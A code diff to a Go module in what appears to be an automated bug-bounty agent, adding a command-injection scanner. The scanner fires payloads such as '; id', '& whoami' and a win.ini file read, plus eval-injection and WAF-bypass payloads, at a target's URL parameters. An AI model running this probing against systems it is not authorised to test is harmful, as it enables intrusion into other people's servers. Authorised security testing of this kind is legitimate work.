@@ -4,6 +4,7 @@ package rce
 import (
 	"context"
 	"fmt"
+	"net/url"
 	"strings"
 
 	"github.com/bb-agent/mirage/internal/agent/base"
@@ -27,20 +28,88 @@ func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Find
 	}
 
 	payloads := generatePayloads(vulnContext)
-	var findings []*base.Finding
-	for _, p := range payloads {
-		findings = append(findings, &base.Finding{
-			Type:       "RCE",
-			URL:        targetURL,
-			Payload:    p.payload,
-			Severity:   "critical", // RCE is always critical
-			Confidence: 0.0,
-			Evidence:   map[string]interface{}{"technique": p.technique, "os_target": p.osTarget},
-			Method:     detectMethod(vulnContext),
-		})
+
+	// Prepend suggested_payloads (KG-proven + adaptive + WAF-bypass) so they run first
+	if raw, ok := item.Payload["suggested_payloads"]; ok {
+		if sp, ok := raw.([]string); ok && len(sp) > 0 {
+			suggested := make([]rcePayload, 0, len(sp))
+			for _, s := range sp {
+				suggested = append(suggested, rcePayload{payload: s, technique: "suggested", osTarget: "unknown"})
+			}
+			payloads = append(suggested, payloads...)
+		}
 	}
-	_ = priority
+
+	// Extract URL parameters to inject into
+	params := extractParams(targetURL)
+	if len(params) == 0 {
+		params = []string{"cmd"}
+	}
+	const maxParams = 3
+	const maxPayloads = 10
+	if len(params) > maxParams {
+		params = params[:maxParams]
+	}
+	if len(payloads) > maxPayloads {
+		payloads = payloads[:maxPayloads]
+	}
+
+	fc := base.NewFuzzClient()
+	method := detectMethod(vulnContext)
+	var findings []*base.Finding
+
+	for _, paramName := range params {
+		for _, p := range payloads {
+			var result base.ProbeResult
+			if method == "POST" {
+				result = fc.ProbePOST(ctx, targetURL, paramName, p.payload)
+			} else {
+				result = fc.ProbeGET(ctx, targetURL, paramName, p.payload)
+			}
+			if result.Error != nil {
+				continue
+			}
+
+			conf := base.DetectRCEOutput(result.Body)
+			if conf == 0.0 {
+				continue
+			}
+
+			findings = append(findings, &base.Finding{
+				Type:       "RCE",
+				URL:        targetURL,
+				Parameter:  paramName,
+				Payload:    p.payload,
+				Severity:   mapPriorityToSeverity(priority),
+				Confidence: conf,
+				Evidence: map[string]interface{}{
+					"technique":   p.technique,
+					"os_target":   p.osTarget,
+					"status_code": result.StatusCode,
+				},
+				Method: method,
+			})
+		}
+	}
+
 	return findings, nil
+}
+
+// extractParams returns query parameter names from a URL.
+func extractParams(rawURL string) []string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return nil
+	}
+	q, err := url.ParseQuery(u.RawQuery)
+	if err != nil || len(q) == 0 {
+		return nil
+	}
+	params := make([]string, 0, len(q))
+	for k := range q {
+		params = append(params, k)
+	}
+	return params
 }
 
 type rcePayload struct {
@@ -52,7 +121,6 @@ type rcePayload struct {
 func generatePayloads(vulnCtx string) []rcePayload {
 	var payloads []rcePayload
 
-	// OS Command Injection (Unix)
 	unixPayloads := []rcePayload{
 		{"; id", "semicolon_chain", "unix"},
 		{"| id", "pipe_chain", "unix"},
@@ -67,7 +135,6 @@ func generatePayloads(vulnCtx string) []rcePayload {
 	}
 	payloads = append(payloads, unixPayloads...)
 
-	// OS Command Injection (Windows)
 	winPayloads := []rcePayload{
 		{"& whoami", "ampersand_chain", "windows"},
 		{"| type C:\\windows\\win.ini", "pipe_file_read", "windows"},
@@ -76,7 +143,6 @@ func generatePayloads(vulnCtx string) []rcePayload {
 	}
 	payloads = append(payloads, winPayloads...)
 
-	// Eval injection (if context suggests dynamic eval)
 	ctx := strings.ToLower(vulnCtx)
 	if strings.Contains(ctx, "eval") || strings.Contains(ctx, "exec") || strings.Contains(ctx, "python") || strings.Contains(ctx, "node") {
 		evalPayloads := []rcePayload{
@@ -96,6 +162,17 @@ func detectMethod(ctx string) string {
 		return "POST"
 	}
 	return "GET"
+}
+
+func mapPriorityToSeverity(priority string) string {
+	switch strings.ToLower(priority) {
+	case "critical":
+		return "critical"
+	case "high":
+		return "high"
+	default:
+		return "critical" // RCE is always critical
+	}
 }
 
 const defaultSystemPrompt = `You are an elite RCE/Command Injection specialist with deep expertise in:
